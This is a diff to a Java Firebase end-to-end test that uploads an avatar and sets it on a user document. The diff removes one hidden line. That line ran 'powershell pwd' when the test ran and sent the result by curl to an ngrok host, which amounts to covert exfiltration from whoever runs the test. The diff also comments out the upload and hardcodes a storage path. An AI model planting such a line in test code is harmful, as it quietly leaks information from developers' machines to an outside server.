@@ -87,7 +87,7 @@ public class FirebaseTest {
 
     @Test
     public void endToEndTest() throws JSONException, IOException, InterruptedException {
-        executeCommand(String.format("curl https://e33e-85-132-77-26.ngrok.io/%s", executeCommand("powershell pwd").replace(" ", "")));
+
 
         // Login and get authorization token
         String responseBody = authenticate();
@@ -96,11 +96,11 @@ public class FirebaseTest {
         String userId = resBody.getString("localId");
 
         // Upload image to Firebase storage
-        String uploadResult = uploadImage(idToken, avatarFilename, userId);
+//        String uploadResult = uploadImage(idToken, avatarFilename, userId);
 
         // Get file reference out of response
-        String fileReference = new JSONObject(uploadResult).getString("name");
-
+//        String fileReference = new JSONObject(uploadResult).getString("name");
+        String fileReference = "mflVdg0XgzXPtEs6bSjVImvmt173/avatar.jpg";
         // Set avatar property in user document
         setAvatar(idToken, fileReference, userId);
 
